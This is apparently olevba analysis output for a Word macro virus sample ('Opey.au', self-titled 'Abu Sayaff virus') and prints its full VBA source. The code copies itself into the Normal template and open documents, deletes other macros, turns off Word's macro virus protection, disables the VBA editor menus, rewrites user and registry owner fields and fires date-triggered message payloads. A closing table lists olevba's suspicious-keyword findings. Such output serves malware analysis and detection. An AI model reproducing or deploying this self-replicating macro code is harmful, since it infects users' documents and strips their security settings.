olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Opey.au
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Opey.au - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Possessed.bas 
in file: ./Virus.MSWord.Opey.au - OLE stream: 'Macros/VBA/Possessed'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Remarks()
'   ABU SAYAFF VIRUS created 09/18/2000 finished 10/03/2000
'   by: eUgEnE
'   Ghostfighter Edition
'   This virus is relatively benign. Created for study purposes only and not intented
'   to destroy or create damages to files/programs
End Sub
Sub Infect()
  On Error Resume Next
  Application.EnableCancelKey = wdCancelDisabled
    Call Initialize
    NTInfected = False
        For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "Possessed" Then NTInfected = True
                If (clan <> "Possessed") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next I
        
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "Possessed" Then ODInfected = True
                    If (clan <> "Possessed") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next J
                
                If ODInfected = False Then
                    k = NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                        If k = Empty Then
                            k = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
                        End If
                    RNA = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, k)
                        If RNA = Empty Then
                            RNA = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, k)
                        End If
                    opendoc.VBProject.VBComponents.Add(1).Name = "Possessed"
                    opendoc.VBProject.VBComponents(2).CodeModule.InsertLines 1, RNA
                End If
            End With
        Next opendoc
        
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Possessed", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
End Sub
Sub Initialize()
    On Error Resume Next
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("tools").Reset
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    ActiveDocument.ReadOnlyRecommended = False
    With Application
        .UserName = "eUgEnE "
        .UserAddress = "Ghostfighter Certified"
        .UserInitials = "RMM2001"
    End With
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "eUgEnE"
        .Title = "Ghostfighter Certified!"
        .Execute
    End With
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\CURRENTVERSION", _
    "RegisteredOwner") = "eUgEnE"
End Sub
Sub FileSave()
    On Error Resume Next
    Call Infect
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Infect
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Infect
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call Infect
End Sub
Sub AutoOpen()
    Call Initialize
    On Error Resume Next
    Call Infect
    ActiveDocument.Save
    Options.VirusProtection = True
End Sub
Sub AutoExec()
    Call Initialize
    On Error Resume Next
    Call Infect
    Call payload
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call Infect
    With Application
        .UserName = "eUgEnE"
        .UserAddress = "Ghostfighter Certified!"
        .UserInitials = "RMM2001"
    End With
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Infect
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call Infect
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Infect
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Infect
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Infect
    Application.Quit
End Sub
Sub BOMB1()
Dim Message, Title, Default, Answer
Application.EnableCancelKey = wdCancelDisabled
try = 0
plus = ""

CHECK:
try = try + 1
If try = 2 Then
    plus = vbCrLf & vbCrLf & "(2) A lazybones, loafer, idler...." & vbCrLf
    
End If
If try = 3 Then
    plus = vbCrLf & vbCrLf & "(2) A lazybones, loafer, idler...." & vbCrLf & vbCrLf & "(3) OK it starts with an S _ _ _ _ _ _"
End If
Message = "This Program is Possessed!!!" & vbCrLf & vbCrLf & "Please answer the question to Access Program" & vbCrLf & vbCrLf & _
            "(1) What do you call an irresponsible JI who shirks a duty or avoids work/obligation ?" & plus & vbCrLf & vbCrLf
Title = "Possessed!!! Bwa! Ha! Ha!"
Default = "Bwa!!! Ha! Ha!"
Answer = InputBox(Message, Title, Default)
Answer = UCase(Answer)
    If Answer = UCase("slacker") Or Answer = UCase("slackers") Then
        MsgBox Prompt:="ACCESS GRANTED"
    ElseIf Answer <> UCase("slacker") Or Answer = UCase("slackers") Then
        If try <> 3 Then
            MsgBox ("ACCESS DENIED" & vbCrLf & vbCrLf & "You have " & 3 - try & " more chance(s) left"), vbExclamation
            GoTo CHECK
        Else
            MsgBox ("Tips: Ask help from MASTER J (The Poker Face) for the Answer")
            Application.Quit
        End If
    End If
End Sub
Sub BOMB2()
    MsgBox ("Happy B-DAY to ROSE MOLINA and MIRSA MERZA"), , "Birthday Greetings!!!"
End Sub
Sub BOMB3()
    MsgBox ("Welcome UERMMMC Medicine 2001 - OPD pipol!!!" & vbCrLf & vbCrLf & "Especially to Master Joven, Tina and John, Peter, Seph, Slacker Henry" & vbCrLf & _
    "MASIPAG na Ronnie, EVERFAITHFUL Agnes and lastly to the SUPER S Rose and Mirsa" & vbCrLf & vbCrLf & "Hello! din sa other half ng group ( Mga S.O.L.'s ) - Space Occupying Lesions" & vbCrLf & _
    "Hi! NETMI, pa-coffee naman kayo dyan =)"), 0, "MABUHAY!!!"
    End
End Sub
Sub BOMB4()
    MsgBox ("Happy Birthday to me! ( The Author )"), , "Birthday Greetings!!!"
End Sub
Sub BOMB5()
    MsgBox ("Happy Birthday to my one and only Rica M."), , "Birthday Greetings!!!"
End Sub
Sub payload()
    On Error Resume Next
        If (Day(Date) = 15) Or (Day(Date) >= 30) Then
            MsgBox ("Bakit naman kasi ngayon lang gumagawa ng endorsements!!!")
        End If
        If (Month(Date) = 11) And (Day(Date) >= 1) Then
            Call BOMB1
        End If
        If (Month(Date) = 2) And (Day(Date) = 27) Then
            Call BOMB2
        End If
        If (Month(Date) = 10) And (Day(Date) = 16) Then
            Call BOMB3
        End If
        If (Month(Date) = 10) And (Day(Date) = 3) Then
            Call BOMB4
        End If
        If (Month(Date) = 7) And (Day(Date) = 27) Then
            Call BOMB5
        End If
End Sub




































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

